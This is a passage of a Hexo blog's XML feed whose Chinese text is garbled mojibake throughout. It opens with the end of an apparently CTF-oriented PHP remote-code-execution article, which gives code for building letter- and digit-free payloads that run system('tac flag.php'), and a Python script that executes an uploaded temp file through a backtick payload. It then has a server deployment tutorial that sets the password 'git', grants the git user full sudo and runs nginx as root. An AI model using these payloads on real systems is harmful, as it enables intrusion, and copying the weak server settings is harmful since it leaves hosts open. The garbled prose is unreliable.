class="string">\$_____________________=++<span class="subst">$____________________</span>; //t</span></span><br><span class="line"><span class="string">\$______________________=++<span class="subst">$_____________________</span>; //u</span></span><br><span class="line"><span class="string">\$_______________________=++<span class="subst">$______________________</span>; //v</span></span><br><span class="line"><span class="string">\$________________________=++<span class="subst">$_______________________</span>; //w</span></span><br><span class="line"><span class="string">\$_________________________=++<span class="subst">$________________________</span>; //x</span></span><br><span class="line"><span class="string">\$__________________________=++<span class="subst">$_________________________</span>; //y</span></span><br><span class="line"><span class="string">\$___________________________=++<span class="subst">$__________________________</span>; //z</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;);</span></span><br><span class="line"><span class="string">code</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$precode</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨å¼‚æˆ–ç”Ÿæˆä»»æ„æ— å­—æ¯æ— æ•°å­—ä»£ç </span></span><br><span class="line">Function <span class="title function_ invoke__">createCode</span>(<span class="variable">$code</span>)&#123;</span><br><span class="line">         <span class="keyword">global</span> <span class="variable">$precode</span>;</span><br><span class="line">         <span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                 <span class="variable">$c</span> = <span class="variable">$code</span>[<span class="variable">$i</span>];</span><br><span class="line">                 <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;<span class="number">97</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;<span class="number">122</span>)&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&quot;<span class="subst">$c</span>&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span>&#123;</span><br><span class="line">                         <span class="variable">$ret</span> .= <span class="string">&#x27;$&#x27;</span>.<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)-<span class="number">96</span>); </span><br><span class="line">                 &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;precode(\&quot;&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$ret</span>,<span class="number">0</span>,<span class="title function_ invoke__">stripos</span>(<span class="variable">$ret</span>, <span class="string">&quot;(&quot;</span>)).<span class="string">&quot;\&quot;)&quot;</span>).str</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">createCode</span>(<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶"><a href="#ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶"></a>ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶</h1><p>å…·ä½“åŸç†å¯ä»¥çœ‹pç¥æ–‡ç« </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>


<h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>é™¤è¿™äº›ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥è¿™æ ·ç”¨$</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>å¥‡æŠ€æ·«å·§</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>hexoéƒ¨ç½²åˆ°é˜¿é‡Œäº‘æœåŠ¡å™¨</title>
    <url>/bolg/hexo%E9%83%A8%E7%BD%B2%E5%88%B0%E9%98%BF%E9%87%8C%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p>åŸŸåè¿˜æ²¡ä¸‹æ¥ï¼Œå°±å…ˆç”¨giteeï¼Œä½†æ˜¯å…ˆè®°å½•ä¸€ä¸‹è‡ªå·±hexoéƒ¨ç½²è¿‡ç¨‹o(<em>ï¿£â–½ï¿£</em>)o</p>
</blockquote>
<span id="more"></span>

<blockquote>
<p>è¿™é‡Œè¯´ä¸€ä¸‹vimçš„åŸºæœ¬æ“ä½œæ–¹ä¾¿ä¸ä¼šçš„åŒå­¦è¿›è¡Œæ­å»º<br>iâ€“&gt;ç¼–è¾‘<br>æŒ‰ä¸€ä¸‹ESCè¾“å…¥:wqâ€“&gt;ä¿å­˜å¹¶é€€å‡ºï¼ˆå†’å·ä¹Ÿè¦è¾“å…¥å•Šï¼ï¼‰<br>æŒ‰ä¸€ä¸‹ESCè¾“å…¥:!wqâ€“&gt;ä¿å­˜å¹¶å¼ºåˆ¶é€€å‡º</p>
</blockquote>
<h3 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h3><ul>
<li>æœ¬åœ°hexoæ„å»ºå¯è¿è¡Œå‘å¸ƒ</li>
<li>é˜¿é‡Œäº‘æœåŠ¡å™¨èƒ½è®¿é—®</li>
<li>æœ‰ä¸€ä¸ªåŸŸå(éå¿…é¡»é¡¹ï¼Œå¯ä»¥å…¬ç½‘ipæŸ¥çœ‹å˜›~)</li>
<li>Xshellå’ŒXftpä¸”å·²è¿æ¥è‡³æœåŠ¡å™¨ï¼ˆæ€ä¹ˆè¿æ¥è‡ªè¡Œç™¾åº¦ï¼Œè¿™é‡Œå°±ä¸åšè¿‡å¤šè®²è§£ï¼‰</li>
</ul>
<h3 id="æœåŠ¡å™¨ç¯å¢ƒ"><a href="#æœåŠ¡å™¨ç¯å¢ƒ" class="headerlink" title="æœåŠ¡å™¨ç¯å¢ƒ"></a>æœåŠ¡å™¨ç¯å¢ƒ</h3><ul>
<li>Ubantu 20.04</li>
</ul>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><ul>
<li>å›é¡¾ä¸€ä¸‹Hexoå‘å¸ƒåˆ°giteeï¼ˆPagesï¼‰çš„æµç¨‹ï¼š</li>
<li>æœ¬åœ°è®¡ç®—æœºç”¨Hexoæ„å»ºé™æ€æ–‡ä»¶public</li>
<li>å…³é”®ä¸€æ­¥å°±æ˜¯gitä¸Šä¼ githubæˆ–gitee</li>
<li>å‘å¸ƒPageså°†ä»“åº“ç›®å½•<a href="https://gitee.com/cungudafa/cungudafa/index.html%E6%8B%89%E5%8F%96%E5%88%B0https://cungudafa.gitee.io/index.html">https://gitee.com/cungudafa/cungudafa/index.htmlæ‹‰å–åˆ°https://cungudafa.gitee.io/index.html</a></li>
</ul>
<p><img src="https://s3.ax1x.com/2020/12/06/DXOrtg.png"><br>å½“ç„¶æˆ‘ä»¬éœ€è¦ä¸Šä¼ çš„æ˜¯publicæ–‡ä»¶å¤¹ï¼›æ¯æ¬¡xftpæ‰‹åŠ¨ä¸Šä¼ è‚¯å®šæ˜¯ä¸ç°å®ä¸”éº»çƒ¦çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥è¦åœ¨æœåŠ¡å™¨å®‰è£…gitã€‚</p>
<h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="æœåŠ¡å™¨åˆ›å»ºæœåŠ¡å™¨åˆ›å»ºgitç”¨æˆ·"><a href="#æœåŠ¡å™¨åˆ›å»ºæœåŠ¡å™¨åˆ›å»ºgitç”¨æˆ·" class="headerlink" title="æœåŠ¡å™¨åˆ›å»ºæœåŠ¡å™¨åˆ›å»ºgitç”¨æˆ·"></a>æœåŠ¡å™¨åˆ›å»ºæœåŠ¡å™¨åˆ›å»ºgitç”¨æˆ·</h3><h4 id="åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·ï¼Œç”¨æ¥è¿è¡ŒgitæœåŠ¡ã€‚ï¼ˆrootä¸å®‰å…¨ï¼‰"><a href="#åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·ï¼Œç”¨æ¥è¿è¡ŒgitæœåŠ¡ã€‚ï¼ˆrootä¸å®‰å…¨ï¼‰" class="headerlink" title="åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·ï¼Œç”¨æ¥è¿è¡ŒgitæœåŠ¡ã€‚ï¼ˆrootä¸å®‰å…¨ï¼‰"></a>åˆ›å»ºä¸€ä¸ªgitç”¨æˆ·ï¼Œç”¨æ¥è¿è¡ŒgitæœåŠ¡ã€‚ï¼ˆrootä¸å®‰å…¨ï¼‰</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo useradd git -m</span><br></pre></td></tr></table></figure>
<blockquote>
<p>æ³¨æ„ï¼šUbantuä¸‹å¿…é¡»åŠ ä¸Š-mï¼Œæ‰ä¼šè‡ªåŠ¨æ–°å»ºç”¨æˆ·ç›®å½•&#x2F;home&#x2F;git&#x2F;ï¼ˆåé¢é…ç½®å’Œåšå®¢æ–‡ä»¶éƒ½æ”¾åœ¨è¿™é‡Œï¼‰<br>åœ¨&#x2F;home&#x2F;git&#x2F;éå¸¸é‡è¦ï¼Œå¦‚æœå‡ºé”™ï¼Œå¯ä»¥åˆ é™¤sudo userdel -r gitç”¨æˆ·ï¼Œé‡æ–°ä¹‹å‰çš„æ­¥éª¤ã€‚</p>
</blockquote>
<h4 id="è®¾ç½®å¯†ç "><a href="#è®¾ç½®å¯†ç " class="headerlink" title="è®¾ç½®å¯†ç "></a>è®¾ç½®å¯†ç </h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo passwd git</span><br></pre></td></tr></table></figure>
<p>å¯†ç å°±æ˜¯gitå§ï¼Œç®€å•ä¸ºä¸Šã€‚</p>
<h4 id="å¢åŠ gitç”¨æˆ·æ‰§è¡Œsudoçš„æƒé™"><a href="#å¢åŠ gitç”¨æˆ·æ‰§è¡Œsudoçš„æƒé™" class="headerlink" title="å¢åŠ gitç”¨æˆ·æ‰§è¡Œsudoçš„æƒé™"></a>å¢åŠ gitç”¨æˆ·æ‰§è¡Œsudoçš„æƒé™</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 740 /etc/sudoers</span><br><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°ä»¥ä¸‹å†…å®¹ï¼šroot ALL&#x3D;(ALL) ALLåœ¨ä¸‹é¢æ·»åŠ ä¸€è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git     ALL=(ALL)       ALL</span><br></pre></td></tr></table></figure>
<p>ä¿å­˜é€€å‡ºåæ”¹å›æƒé™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 400 /etc/sudoers</span><br></pre></td></tr></table></figure>

<h3 id="æœåŠ¡å™¨æ‰“å¼€RSAè®¤è¯"><a href="#æœåŠ¡å™¨æ‰“å¼€RSAè®¤è¯" class="headerlink" title="æœåŠ¡å™¨æ‰“å¼€RSAè®¤è¯"></a>æœåŠ¡å™¨æ‰“å¼€RSAè®¤è¯</h3><p>RSAç”¨å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼Œæˆä¸ºåŠ å¯†é€šä¿¡ã€‚<br>ç”¨ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯†ï¼Œå°±æ˜¯è®¤è¯ã€‚ï¼ˆè¿™æ ·å°±èƒ½è¯æ˜æ¶ˆæ¯æ˜¯ä½ å‘å‡ºçš„ã€‚ï¼‰<br>å› ä¸ºï¼šå…¬é’¥å¤§å®¶éƒ½æœ‰ï¼Œç§é’¥å°±åªæœ‰ä¸€ä¸ªï¼Œåœ¨ä½ è‡ªå·±æ‰‹é‡Œã€‚<br><img src="https://s3.ax1x.com/2020/12/06/DXzRTP.png"></p>
<h4 id="å¼€å¯è®¤è¯é…ç½®"><a href="#å¼€å¯è®¤è¯é…ç½®" class="headerlink" title="å¼€å¯è®¤è¯é…ç½®"></a>å¼€å¯è®¤è¯é…ç½®</h4><h5 id="æœåŠ¡å™¨ç«¯ï¼š"><a href="#æœåŠ¡å™¨ç«¯ï¼š" class="headerlink" title="æœåŠ¡å™¨ç«¯ï¼š"></a>æœåŠ¡å™¨ç«¯ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
<p>åœ¨sshd_configä¸­å¼€å¯ä»¥ä¸‹å‡ é¡¹ï¼š(å‰ä¸¤é¡¹yesï¼Œåä¸€é¡¹ä¿®æ”¹ä¸ºå¦‚ä¸‹)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile  .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>é‡å¯sshd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop sshd.service</span><br><span class="line">systemctl start sshd.service</span><br></pre></td></tr></table></figure>
<h4 id="å»ºç«‹sshä¿¡ä»»å…³ç³»"><a href="#å»ºç«‹sshä¿¡ä»»å…³ç³»" class="headerlink" title="å»ºç«‹sshä¿¡ä»»å…³ç³»"></a>å»ºç«‹sshä¿¡ä»»å…³ç³»</h4><p>æœ¬åœ°ç”µè„‘ç”Ÿæˆç§˜é’¥å¯¹-&gt;å‘é€å…¬é’¥åˆ°æœåŠ¡å™¨-&gt;æœ¬åœ°å¯å…å¯†è¿æ¥æœåŠ¡å™¨</p>
<h5 id="åœ¨æœ¬åœ°ç”µè„‘-ç”Ÿæˆå¯†é’¥å¯¹"><a href="#åœ¨æœ¬åœ°ç”µè„‘-ç”Ÿæˆå¯†é’¥å¯¹" class="headerlink" title="åœ¨æœ¬åœ°ç”µè„‘:ç”Ÿæˆå¯†é’¥å¯¹"></a>åœ¨æœ¬åœ°ç”µè„‘:ç”Ÿæˆå¯†é’¥å¯¹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;é‚®ç®±&quot; </span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjSY9S.png"><br>æˆåŠŸåï¼Œä¼šåœ¨cç›˜ç”¨æˆ·ä¸‹æ–°å»ºç§˜é’¥å¯¹ï¼š</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjSrNV.png"></p>
<h5 id="åœ¨æœåŠ¡å™¨-åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º-x2F-ssh-æ–‡ä»¶å¤¹"><a href="#åœ¨æœåŠ¡å™¨-åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º-x2F-ssh-æ–‡ä»¶å¤¹" class="headerlink" title="åœ¨æœåŠ¡å™¨:åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º ~&#x2F;.ssh æ–‡ä»¶å¤¹"></a>åœ¨æœåŠ¡å™¨:åˆ‡æ¢è‡³gitç”¨æˆ·ï¼Œåˆ›å»º ~&#x2F;.ssh æ–‡ä»¶å¤¹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">mkdir ~/.ssh</span><br></pre></td></tr></table></figure>
<p>æˆ–è€…rootç”¨æˆ·ç›´æ¥åˆ›å»ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/</span><br><span class="line">mkdir .ssh</span><br></pre></td></tr></table></figure>

<h5 id="åœ¨æœ¬åœ°ç”µè„‘-å‘é€å…¬é’¥-id-rsa-pub-åˆ°-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys"><a href="#åœ¨æœ¬åœ°ç”µè„‘-å‘é€å…¬é’¥-id-rsa-pub-åˆ°-x2F-home-x2F-git-x2F-ssh-x2F-authorzied-keys" class="headerlink" title="åœ¨æœ¬åœ°ç”µè„‘:å‘é€å…¬é’¥ id_rsa.pub åˆ° &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys"></a>åœ¨æœ¬åœ°ç”µè„‘:å‘é€å…¬é’¥ id_rsa.pub åˆ° &#x2F;home&#x2F;git&#x2F;.ssh&#x2F;authorzied_keys</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-copy-id -i C:/Users/CUNGU/.ssh/id_rsa.pub git@47.93.50.90 //æŠŠå…¬é’¥å‘é€ç»™æœåŠ¡å™¨</span><br><span class="line">ssh git@47.93.50.90 // æµ‹è¯•èƒ½å¦ç™»å½•</span><br></pre></td></tr></table></figure>
<p>æœåŠ¡å™¨æ–‡ä»¶å¤¹ä¹Ÿæœ‰äº†å…¬é’¥ï¼š</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpPgg.png"></p>
<h5 id="æ–‡ä»¶å¤¹æƒé™è°ƒæ•´ï¼šauthorzied-keysæƒé™ä¸º600æ—¶æ‰ç”Ÿæ•ˆ"><a href="#æ–‡ä»¶å¤¹æƒé™è°ƒæ•´ï¼šauthorzied-keysæƒé™ä¸º600æ—¶æ‰ç”Ÿæ•ˆ" class="headerlink" title="æ–‡ä»¶å¤¹æƒé™è°ƒæ•´ï¼šauthorzied_keysæƒé™ä¸º600æ—¶æ‰ç”Ÿæ•ˆ"></a>æ–‡ä»¶å¤¹æƒé™è°ƒæ•´ï¼šauthorzied_keysæƒé™ä¸º600æ—¶æ‰ç”Ÿæ•ˆ</h5><p>gitç”¨æˆ·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod 700 ~/.ssh</span><br><span class="line">chmod 600 ~/.ssh/authorzied_keys</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ­¥æ²¡æœ‰æˆåŠŸï¼Œè¯´æˆ‘æ²¡æœ‰æƒé™ï¼ˆPermission deniedï¼‰ï¼›emmmï¼Œrootè®¾ç½®å¥½äº†</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjpK8U.png"><br>rootè®¾ç½®ç¬¬äºŒæ­¥ï¼š(æ³¨æ„åœ¨.sshç›®å½•ä¸‹)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit // é€€å‡ºåˆ° root ç™»å½•</span><br><span class="line">sudo chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Djp2Pf.png"><br>ç°åœ¨å°±æ­å»ºå¥½gitæ¡¥æ¢ï¼Œä¸ºåé¢å®ç°hexo déƒ¨ç½²æ—¶ï¼Œå¯ä»¥è‡ªåŠ¨ä¸Šä¼ å•¦ï¼</p>
<h3 id="åˆ›å»ºblog-gitç©ºä»“åº“"><a href="#åˆ›å»ºblog-gitç©ºä»“åº“" class="headerlink" title="åˆ›å»ºblog.gitç©ºä»“åº“"></a>åˆ›å»ºblog.gitç©ºä»“åº“</h3><h4 id="åˆ‡æ¢åˆ°gitç”¨æˆ·ï¼Œæ¥ä¸‹æ¥éƒ½æ˜¯åœ¨gitç”¨æˆ·æƒé™ä¸‹è¿›è¡Œæ“ä½œï¼š"><a href="#åˆ‡æ¢åˆ°gitç”¨æˆ·ï¼Œæ¥ä¸‹æ¥éƒ½æ˜¯åœ¨gitç”¨æˆ·æƒé™ä¸‹è¿›è¡Œæ“ä½œï¼š" class="headerlink" title="åˆ‡æ¢åˆ°gitç”¨æˆ·ï¼Œæ¥ä¸‹æ¥éƒ½æ˜¯åœ¨gitç”¨æˆ·æƒé™ä¸‹è¿›è¡Œæ“ä½œï¼š"></a>åˆ‡æ¢åˆ°gitç”¨æˆ·ï¼Œæ¥ä¸‹æ¥éƒ½æ˜¯åœ¨gitç”¨æˆ·æƒé™ä¸‹è¿›è¡Œæ“ä½œï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git                //åˆ‡æ¢gitç”¨æˆ·</span><br><span class="line">cd /home/git/</span><br><span class="line">mkdir -p projects/blog  //åˆ›å»ºä½ çš„åšå®¢ç›®å½•</span><br><span class="line">mkdir repos &amp;&amp; cd repos</span><br><span class="line">git init --bare blog.git  //åˆ›å»ºä¸€ä¸ªç©ºä»“åº“</span><br><span class="line">cd blog.git/hooks</span><br><span class="line">vi post-receive  //åˆ›å»ºhooké’©å­å‡½æ•°ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹</span><br><span class="line">git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f</span><br><span class="line">chmod +x post-receive  // ä¿®æ”¹é’©å­å‡½æ•°æƒé™</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj98SS.png"></p>
<h4 id="æ”¹å˜-hexo-git-ç›®å½•çš„æ‹¥æœ‰è€…ä¸ºgitç”¨æˆ·ï¼š"><a href="#æ”¹å˜-hexo-git-ç›®å½•çš„æ‹¥æœ‰è€…ä¸ºgitç”¨æˆ·ï¼š" class="headerlink" title="æ”¹å˜ hexo.git ç›®å½•çš„æ‹¥æœ‰è€…ä¸ºgitç”¨æˆ·ï¼š"></a>æ”¹å˜ hexo.git ç›®å½•çš„æ‹¥æœ‰è€…ä¸ºgitç”¨æˆ·ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chown -R git:git blog.git</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/Dj9BWT.png"></p>
<h5 id="æ·»åŠ å¤‡ä»½ç›®å½•"><a href="#æ·»åŠ å¤‡ä»½ç›®å½•" class="headerlink" title="æ·»åŠ å¤‡ä»½ç›®å½•"></a>æ·»åŠ å¤‡ä»½ç›®å½•</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/git/projects/</span><br><span class="line">mkdir -p tmp/blog</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹é’©å­çš„å†…å®¹ï¼šï¼ˆé‡ç‚¹æ˜¯git clone å…‹éš†åˆ°ä¸»ç›®å½•home&#x2F;git&#x2F;projects&#x2F;blogä¸»ç›®å½•è¦é…ç½®åˆ°nginxä¸­å»çš„ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">GIT_REPO=/home/git/repos/blog.git    # gitä»“åº“</span><br><span class="line">TMP_GIT_CLONE=/home/git/projects/tmp/blog</span><br><span class="line">PUBLIC_WWW=/home/git/projects/blog  # ç½‘ç«™ç›®å½•</span><br><span class="line">rm -rf $&#123;TMP_GIT_CLONE&#125;</span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line">rm -rf $&#123;PUBLIC_WWW&#125;/*</span><br><span class="line">cp -rf $&#123;TMP_GIT_CLONE&#125;/* $&#123;PUBLIC_WWW&#125;</span><br><span class="line">chmod +x post-receive          # èµ‹äºˆè„šæœ¬çš„æ‰§è¡Œæƒé™</span><br></pre></td></tr></table></figure>
<p>gitç”¨æˆ·èµ‹æƒï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">chmod +x post-receive</span><br><span class="line">exit // é€€å‡ºåˆ° root ç™»å½•</span><br><span class="line">chown -R git:git /home/git/repos/blog.git // æ·»åŠ æƒé™</span><br><span class="line">sudo chown git:git -R /home/git/projects/</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjCPmj.png"></p>
<p>è“è‰²ä¸ºæ›´æ–°åçš„ä¸Šä¼ æœºåˆ¶ï¼š</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCncF.png"></p>
<p>ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘ä»¬éœ€è¦å…³é—­gitè´¦å·ç™»å½•shellçš„æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/passwd</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°gitè´¦å·(ä¸€èˆ¬åœ¨æœ€åé¢)æ·»åŠ ï¼š&#x2F;usr&#x2F;bin&#x2F;git-shell</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjCl7R.png"></p>
<p>åŠ ä¸Šgitå°±åªèƒ½git cloneï¼Œå¦‚éœ€shellæ“ä½œï¼Œæ’¤é”€&#x2F;usr&#x2F;bin&#x2F;git-shellå³å¯ã€‚</p>
<p>####åœ¨æœ¬åœ°ä»»æ„ä¸€ç©ºç›®å½•ï¼Œæµ‹è¯•gitä»“åº“æ˜¯å¦å¯ç”¨ï¼ˆæµ‹è¯•æ­¥éª¤ï¼Œç¨åå¯æ¸…é™¤ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone git@48.53.57.50:/home/git/repos/blog.git</span><br></pre></td></tr></table></figure>

<p>å®é™…æ‹‰ä¸‹æ¥çš„æ˜¯ä½ çš„&#x2F;home&#x2F;git&#x2F;projects&#x2F;blogï¼Œå“ˆå“ˆå“ˆè¿˜æ˜¯ç©ºçš„~</p>
<p><img src="https://s3.ax1x.com/2020/12/06/DjC3A1.png"></p>
<h3 id="hexoé…ç½®"><a href="#hexoé…ç½®" class="headerlink" title="hexoé…ç½®"></a>hexoé…ç½®</h3><p>ä¿®æ”¹åšå®¢æ ¹ç›®å½•é…ç½®_config.ymlï¼Œéƒ¨ç½²éƒ¨åˆ†ï¼Œå¢æ·»repo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  message: update</span><br><span class="line">  gitee: https://gitee.com/cungudafa/cungudafa.git</span><br><span class="line">  repo: git@48.53.57.50:/home/git/repos/blog.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<blockquote>
<p>åªæœ‰åœ¨sshç§˜é’¥é…ç½®æˆåŠŸï¼Œæ‰èƒ½æˆåŠŸä¸Šä¼ ã€‚å¦‚æœéœ€è¦ä¿®æ”¹å…¬é’¥ï¼Œè¦æ‰“å¼€gitæ“ä½œshellçš„æƒé™å“¦ï¼vim &#x2F;etc&#x2F;passwdæœ€åä¸€å¥ã€‚åŠæ—¶å¼€ï¼ŒåŠæ—¶å…³ï¼Œåšåˆ°ä¸‡æ— ä¸€å¤±ã€‚</p>
</blockquote>
<h3 id="nginxé…ç½®"><a href="#nginxé…ç½®" class="headerlink" title="nginxé…ç½®"></a>nginxé…ç½®</h3><ul>
<li>åˆ°è¿™é‡Œï¼Œæˆ‘å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œç”¨æºç å®‰è£…å’Œsudo apt install nginxå®‰è£…ï¼Œæ–‡ä»¶ç»“æ„æ˜¯ä¸åŒçš„</li>
<li>è¿™é‡Œæˆ‘é€‰æ‹©çš„æ˜¯sudo apt install nginxçš„æ–¹å¼å®‰è£…<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="ä¿®æ”¹é…ç½®"><a href="#ä¿®æ”¹é…ç½®" class="headerlink" title="ä¿®æ”¹é…ç½®"></a>ä¿®æ”¹é…ç½®</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹ç”¨æˆ·ä¸ºrootç”¨æˆ·</p>
<p><img src="https://s3.ax1x.com/2020/12/06/Dji6Og.png"></p>
<p>1.ç«¯å£å·ï¼ˆé˜¿é‡Œäº‘æ§åˆ¶å°å®‰å…¨ç»„è§„åˆ™è¦æ‰“å¼€ç«¯å£å“¦ï¼‰<br>2.ä¿®æ”¹åŸŸå<br>3.ä¿®æ”¹æ ¹ç›®å½•ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2020/12/06/DjFPne.png"></p>
<blockquote>
<p>åˆ°è¿™é‡Œåªè¦é‡å¯nginxå°±å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘æ²¡å‘ç°sbinæ–‡ä»¶ï¼Œå°±ä»è¿›ç¨‹é‡å¯äº†</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep nginx</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -HUP è¿›ç¨‹å·</span><br></pre></td></tr></table></figure>

<p><img src="https://s3.ax1x.com/2020/12/06/DjF69x.png"></p>
